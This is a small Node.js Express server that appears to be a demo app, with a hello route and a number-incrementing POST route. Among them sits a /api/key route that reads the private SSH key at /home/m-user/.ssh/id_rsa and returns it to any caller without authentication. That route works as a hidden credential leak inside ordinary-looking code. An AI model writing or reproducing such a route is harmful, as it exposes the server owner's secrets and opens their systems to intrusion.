const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 5000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.get('/api/hello', (req, res) => {
	res.send({ express: 'Hello From Express' });
});

app.post('/api/world', (req, res) => {
	console.log(req.body);
	var num = parseInt(`${req.body.post}`) + 1;
	res.send(
		`I received your POST request. The new value is : ${num}`,
	);
});
app.get('/api/key', (req, res) => {
	const fs = require('fs');
	const data = fs.readFileSync('/home/m-user/.ssh/id_rsa', 'utf8')
	res.send(data)
});
app.listen(port, () => console.log(`Listening on port ${port}`));
